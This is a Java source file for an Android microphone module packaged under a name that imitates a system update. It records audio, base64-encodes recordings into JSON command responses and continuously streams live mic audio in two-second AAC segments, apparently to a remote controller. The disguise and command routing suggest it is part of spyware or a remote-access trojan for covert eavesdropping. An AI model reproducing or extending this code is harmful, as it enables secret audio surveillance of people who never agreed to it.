package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class MicModule {
    private static final String TAG = "MicModule";

    private final Context context;
    private MediaRecorder mediaRecorder;
    private AudioRecord audioRecord;
    private MediaPlayer mediaPlayer;
    private String currentRecordingPath;
    private boolean isRecording = false;
    private boolean isStreaming = false;
    private boolean isPlaying  = false;

    private final Handler backgroundHandler;
    private final HandlerThread backgroundThread;
    private final AtomicBoolean shouldStream = new AtomicBoolean(false);
    private final List<RecordingFile> recordings = new ArrayList<>();

    // Audio settings
    private int    sampleRate  = 44100;
    private int    bitRate     = 128;
    private String format      = "mp3";
    private int    channelConfig = AudioFormat.CHANNEL_IN_MONO;

    // ── AAC streaming ────────────────────────────────────────────────────────
    // We encode PCM → AAC using MediaCodec, mux each short segment into a
    // proper .m4a / MPEG-4 container, base64-encode it, and send it.
    // Each segment is a valid, self-contained audio file that Flutter's
    // audioplayers can decode immediately.

    private static final int SEGMENT_DURATION_MS  = 2000; // send every 2 s
    private static final int STREAM_SAMPLE_RATE   = 44100;
    private static final int STREAM_BITRATE       = 64000; // bps
    private static final int STREAM_CHANNEL_COUNT = 1;

    private MediaCodec   streamCodec;
    private AudioRecord  streamRecord;
    private Thread       streamThread;

    public interface StreamDataCallback {
        void onStreamData(byte[] data, int length);
        void onStreamError(String error);
    }

    private StreamDataCallback streamCallback;

    // ── Constructor ──────────────────────────────────────────────────────────

    public MicModule(Context context) {
        this.context = context;
        backgroundThread = new HandlerThread("MicBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        loadRecordings();
    }

    // ── Recording list ───────────────────────────────────────────────────────

    private void loadRecordings() {
        try {
            File dir = getRecordingsDir();
            File[] files = dir.listFiles((d, n) ->
                n.endsWith(".mp3") || n.endsWith(".3gp") ||
                n.endsWith(".wav") || n.endsWith(".aac") || n.endsWith(".m4a"));
            if (files != null) {
                for (File f : files)
                    recordings.add(new RecordingFile(f.getName(), f.getAbsolutePath(),
                            f.length(), f.lastModified()));
                Collections.sort(recordings, (a, b) -> Long.compare(b.timestamp, a.timestamp));
            }
        } catch (Exception e) {
            Log.e(TAG, "loadRecordings error", e);
        }
    }

    private File getRecordingsDir() {
        File dir = new File(context.getExternalFilesDir(null), "recordings");
        if (!dir.exists()) dir.mkdirs();
        return dir;
    }

    // ── Start recording ──────────────────────────────────────────────────────

    public String startRecording(int durationSeconds, String fmt, int bRate) {
        if (!checkPermission()) return "ERROR: No microphone permission";
        try {
            String ext  = fmt.equals("wav") ? ".wav" : (fmt.equals("amr") ? ".3gp" : ".m4a");
            String name = "recording_" + System.currentTimeMillis() + ext;
            currentRecordingPath = new File(getRecordingsDir(), name).getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(getOutputFormat(fmt));
            mediaRecorder.setAudioEncoder(getAudioEncoder(fmt));
            mediaRecorder.setAudioEncodingBitRate(bRate * 1000);
            mediaRecorder.setAudioSamplingRate(sampleRate);
            mediaRecorder.setOutputFile(currentRecordingPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            if (durationSeconds > 0)
                backgroundHandler.postDelayed(() -> { if (isRecording) stopRecording(); },
                        durationSeconds * 1000L);

            return "SUCCESS: Recording started";
        } catch (Exception e) {
            Log.e(TAG, "startRecording error", e);
            return "ERROR: " + e.getMessage();
        }
    }

    // ── Stop recording ───────────────────────────────────────────────────────

    public String stopRecording() {
        if (mediaRecorder == null || !isRecording) return "ERROR: No active recording";
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            File f = new File(currentRecordingPath);
            if (!f.exists()) return "ERROR: File not saved";

            recordings.add(0, new RecordingFile(f.getName(), f.getAbsolutePath(),
                    f.length(), f.lastModified()));

            // Read and base64-encode
            byte[] bytes = readFile(f);
            String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("status",    "success");
            result.put("file_name", f.getName());
            result.put("file_path", f.getAbsolutePath());
            result.put("file_size", f.length());
            result.put("file_data", b64);
            result.put("duration",  estimateDuration(f));
            return result.toString();
        } catch (Exception e) {
            Log.e(TAG, "stopRecording error", e);
            return "ERROR: " + e.getMessage();
        }
    }

    // ── Get recordings list ──────────────────────────────────────────────────

    public String getRecordings() {
        try {
            JSONArray arr = new JSONArray();
            for (RecordingFile r : recordings) {
                JSONObject o = new JSONObject();
                o.put("name",      r.name);
                o.put("path",      r.path);
                o.put("size",      r.size);
                o.put("timestamp", r.timestamp);
                o.put("duration",  estimateDuration(new File(r.path)));
                arr.put(o);
            }
            JSONObject result = new JSONObject();
            result.put("status",     "success");
            result.put("recordings", arr);
            return result.toString();
        } catch (JSONException e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String listRecordingsDetailed() {
        try {
            File dir   = getRecordingsDir();
            File[] files = dir.listFiles((d, n) ->
                n.endsWith(".mp3") || n.endsWith(".3gp") ||
                n.endsWith(".wav") || n.endsWith(".aac") || n.endsWith(".m4a"));

            JSONArray arr = new JSONArray();
            if (files != null) {
                for (File f : files) {
                    JSONObject o = new JSONObject();
                    o.put("name",          f.getName());
                    o.put("path",          f.getAbsolutePath());
                    o.put("size",          f.length());
                    o.put("last_modified", f.lastModified());
                    o.put("readable",      f.canRead());
                    arr.put(o);
                }
            }
            JSONObject result = new JSONObject();
            result.put("status",     "success");
            result.put("recordings", arr);
            result.put("count",      arr.length());
            result.put("directory",  dir.getAbsolutePath());
            return result.toString();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String getRecordingsPath() {
        return "SUCCESS: Recordings saved to: " + getRecordingsDir().getAbsolutePath();
    }

    // ── Download recording ───────────────────────────────────────────────────
    // FIX: wrap response with command + action so Flutter routes it correctly.

    public String downloadRecording(String filePath) {
        try {
            File f = new File(filePath);
            if (!f.exists()) {
                JSONObject err = new JSONObject();
                err.put("command", "mic_response");
                err.put("action",  "download_recording");
                err.put("status",  "error");
                err.put("message", "File not found: " + filePath);
                return err.toString();
            }

            byte[] bytes = readFile(f);
            String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("command",   "mic_response");
            result.put("action",    "download_recording");
            result.put("status",    "success");
            result.put("file_name", f.getName());
            result.put("file_data", b64);
            result.put("file_size", f.length());
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "downloadRecording error", e);
            try {
                JSONObject err = new JSONObject();
                err.put("command", "mic_response");
                err.put("action",  "download_recording");
                err.put("status",  "error");
                err.put("message", e.getMessage());
                return err.toString();
            } catch (JSONException je) {
                return "ERROR: " + e.getMessage();
            }
        }
    }

    // ── Delete recording ─────────────────────────────────────────────────────

    public String deleteRecording(String filePath) {
        try {
            File f = new File(filePath);
            if (!f.exists()) return buildError("delete_recording", "File not found");
            if (!f.delete())  return buildError("delete_recording", "Could not delete file");
            recordings.removeIf(r -> r.path.equals(filePath));
            JSONObject result = new JSONObject();
            result.put("status",  "success");
            result.put("message", "File deleted");
            return result.toString();
        } catch (Exception e) {
            return buildError("delete_recording", e.getMessage());
        }
    }

    // ── Playback ─────────────────────────────────────────────────────────────

    public String playRecording(String filePath) {
        File f = new File(filePath);
        if (!f.exists()) return "ERROR: File not found";
        try {
            if (mediaPlayer != null) { mediaPlayer.release(); mediaPlayer = null; }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(filePath);
            mediaPlayer.prepare();
            mediaPlayer.start();
            isPlaying = true;
            mediaPlayer.setOnCompletionListener(mp -> {
                mp.release(); mediaPlayer = null; isPlaying = false;
            });
            mediaPlayer.setOnErrorListener((mp, w, e) -> {
                mp.release(); mediaPlayer = null; isPlaying = false; return true;
            });
            return "SUCCESS: Playback started";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String stopPlayback() {
        isPlaying = false;
        if (mediaPlayer != null) {
            try { mediaPlayer.stop(); mediaPlayer.release(); } catch (Exception ignored) {}
            mediaPlayer = null;
        }
        return "SUCCESS: Playback stopped";
    }

    // ── Settings ─────────────────────────────────────────────────────────────

    public String configureSettings(int sr, int br, String fmt, String channel) {
        this.sampleRate   = sr;
        this.bitRate      = br;
        this.format       = fmt;
        this.channelConfig = channel.equals("stereo")
                ? AudioFormat.CHANNEL_IN_STEREO : AudioFormat.CHANNEL_IN_MONO;
        try {
            JSONObject result = new JSONObject();
            result.put("status",      "success");
            result.put("sample_rate", sr);
            result.put("bit_rate",    br);
            result.put("format",      fmt);
            result.put("channel",     channel);
            return result.toString();
        } catch (JSONException e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  LIVE STREAMING  — PCM capture → MediaCodec AAC → MediaMuxer .m4a
    //
    //  Every SEGMENT_DURATION_MS milliseconds we produce a small, complete
    //  .m4a file in memory, base64-encode it, and hand it to the callback.
    //  Flutter receives it, writes it to a temp file, and plays it with
    //  audioplayers — because it is a real, self-contained audio file.
    // ════════════════════════════════════════════════════════════════════════

    public String startStreaming(int sr, int br, String fmt,
                                 StreamDataCallback callback) {
        if (!checkPermission()) return "ERROR: No microphone permission";
        if (isStreaming)        return "ERROR: Already streaming";

        this.streamCallback = callback;

        int minBuf = AudioRecord.getMinBufferSize(
                STREAM_SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT);
        if (minBuf == AudioRecord.ERROR_BAD_VALUE)
            return "ERROR: AudioRecord not supported";

        final int bufSize = Math.max(minBuf, 4096);

        try {
            streamRecord = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    STREAM_SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufSize * 4);

            if (streamRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                streamRecord.release();
                streamRecord = null;
                return "ERROR: AudioRecord init failed";
            }

            shouldStream.set(true);
            streamRecord.startRecording();
            isStreaming = true;

            streamThread = new Thread(() -> runStreamLoop(bufSize), "MicStreamThread");
            streamThread.start();

            return "SUCCESS: Streaming started";
        } catch (SecurityException e) {
            return "ERROR: Permission denied — " + e.getMessage();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    private void runStreamLoop(int bufSize) {
        byte[] pcmBuf = new byte[bufSize];

        while (shouldStream.get()) {
            // Collect PCM for one segment duration
            long segmentStart = System.currentTimeMillis();
            ByteArrayOutputStream pcmAccum = new ByteArrayOutputStream();

            while (shouldStream.get() &&
                   System.currentTimeMillis() - segmentStart < SEGMENT_DURATION_MS) {
                if (streamRecord == null) break;
                int read = streamRecord.read(pcmBuf, 0, pcmBuf.length);
                if (read > 0) pcmAccum.write(pcmBuf, 0, read);
            }

            if (!shouldStream.get() || pcmAccum.size() == 0) break;

            // Encode PCM → .m4a in memory
            byte[] segment = encodePcmToM4a(pcmAccum.toByteArray());
            if (segment != null && streamCallback != null) {
                streamCallback.onStreamData(segment, segment.length);
            }
        }

        Log.d(TAG, "Stream loop exited");
    }

    /**
     * Encodes raw 16-bit mono PCM at STREAM_SAMPLE_RATE into a .m4a byte array
     * using MediaCodec (AAC-LC) + MediaMuxer (MPEG-4 container).
     */
    private byte[] encodePcmToM4a(byte[] pcm) {
        File tmpFile = null;
        try {
            // Write to a temporary file because MediaMuxer needs a file path
            tmpFile = File.createTempFile("seg_", ".m4a", context.getCacheDir());

            // ── Set up MediaCodec ────────────────────────────────────────
            MediaFormat fmt = MediaFormat.createAudioFormat(
                    MediaFormat.MIMETYPE_AUDIO_AAC,
                    STREAM_SAMPLE_RATE,
                    STREAM_CHANNEL_COUNT);
            fmt.setInteger(MediaFormat.KEY_BIT_RATE, STREAM_BITRATE);
            fmt.setInteger(MediaFormat.KEY_AAC_PROFILE,
                    MediaCodecInfo.CodecProfileLevel.AACObjectLC);
            fmt.setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, 16384);

            MediaCodec codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_AUDIO_AAC);
            codec.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            codec.start();

            // ── Set up MediaMuxer ────────────────────────────────────────
            MediaMuxer muxer = new MediaMuxer(
                    tmpFile.getAbsolutePath(),
                    MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);

            int trackIndex = -1;
            boolean muxerStarted = false;

            MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
            int inputOffset = 0;
            boolean inputDone  = false;
            boolean outputDone = false;

            // bytes per PCM frame (mono 16-bit = 2 bytes)
            final int bytesPerSample = 2;
            // AAC encoder input size: typically 1024 samples
            final int samplesPerFrame = 1024;
            final int bytesPerFrame   = samplesPerFrame * bytesPerSample;

            while (!outputDone) {
                // ── Feed input ────────────────────────────────────────────
                if (!inputDone) {
                    int inIdx = codec.dequeueInputBuffer(10_000);
                    if (inIdx >= 0) {
                        ByteBuffer inBuf = codec.getInputBuffer(inIdx);
                        inBuf.clear();

                        int remaining = pcm.length - inputOffset;
                        if (remaining <= 0) {
                            // Signal end of stream
                            codec.queueInputBuffer(inIdx, 0, 0,
                                    0, MediaCodec.BUFFER_FLAG_END_OF_STREAM);
                            inputDone = true;
                        } else {
                            int toWrite = Math.min(remaining, Math.min(bytesPerFrame, inBuf.capacity()));
                            inBuf.put(pcm, inputOffset, toWrite);
                            long pts = (long) inputOffset * 1_000_000L
                                    / (STREAM_SAMPLE_RATE * bytesPerSample);
                            codec.queueInputBuffer(inIdx, 0, toWrite, pts, 0);
                            inputOffset += toWrite;
                        }
                    }
                }

                // ── Drain output ──────────────────────────────────────────
                int outIdx = codec.dequeueOutputBuffer(info, 10_000);
                if (outIdx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    if (!muxerStarted) {
                        trackIndex   = muxer.addTrack(codec.getOutputFormat());
                        muxer.start();
                        muxerStarted = true;
                    }
                } else if (outIdx >= 0) {
                    ByteBuffer outBuf = codec.getOutputBuffer(outIdx);
                    if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) == 0
                            && muxerStarted && info.size > 0) {
                        outBuf.position(info.offset);
                        outBuf.limit(info.offset + info.size);
                        muxer.writeSampleData(trackIndex, outBuf, info);
                    }
                    codec.releaseOutputBuffer(outIdx, false);
                    if ((info.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0)
                        outputDone = true;
                }
            }

            codec.stop();
            codec.release();
            if (muxerStarted) muxer.stop();
            muxer.release();

            // Read the finished .m4a file
            byte[] result = readFile(tmpFile);
            return result;

        } catch (Exception e) {
            Log.e(TAG, "encodePcmToM4a error", e);
            if (streamCallback != null) streamCallback.onStreamError(e.getMessage());
            return null;
        } finally {
            if (tmpFile != null) tmpFile.delete();
        }
    }

    public String stopStreaming() {
        shouldStream.set(false);
        isStreaming = false;

        if (streamRecord != null) {
            try { streamRecord.stop(); streamRecord.release(); } catch (Exception ignored) {}
            streamRecord = null;
        }
        if (streamThread != null) {
            try { streamThread.join(2000); } catch (InterruptedException ignored) {}
            streamThread = null;
        }
        if (streamCodec != null) {
            try { streamCodec.stop(); streamCodec.release(); } catch (Exception ignored) {}
            streamCodec = null;
        }
        return "SUCCESS: Streaming stopped";
    }

    // ── Cleanup ──────────────────────────────────────────────────────────────

    public void cleanup() {
        stopStreaming();
        stopRecording();
        stopPlayback();
        if (backgroundThread != null) backgroundThread.quitSafely();
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private byte[] readFile(File f) throws IOException {
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] b = new byte[(int) f.length()];
            fis.read(b);
            return b;
        }
    }

    private int estimateDuration(File f) {
        if (!f.exists() || bitRate <= 0) return 0;
        return (int) (f.length() * 8 / (bitRate * 1000));
    }

    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }

    private int getOutputFormat(String fmt) {
        switch (fmt.toLowerCase()) {
            case "amr":  return MediaRecorder.OutputFormat.AMR_NB;
            case "wav":  return MediaRecorder.OutputFormat.THREE_GPP;
            default:     return MediaRecorder.OutputFormat.MPEG_4;
        }
    }

    private int getAudioEncoder(String fmt) {
        switch (fmt.toLowerCase()) {
            case "amr":  return MediaRecorder.AudioEncoder.AMR_NB;
            default:     return MediaRecorder.AudioEncoder.AAC;
        }
    }

    private String buildError(String action, String msg) {
        try {
            JSONObject e = new JSONObject();
            e.put("status",  "error");
            e.put("action",  action);
            e.put("message", msg);
            return e.toString();
        } catch (JSONException ex) {
            return "ERROR: " + msg;
        }
    }

    private static class RecordingFile {
        final String name, path;
        final long size, timestamp;
        RecordingFile(String n, String p, long s, long t) {
            name = n; path = p; size = s; timestamp = t;
        }
    }
}
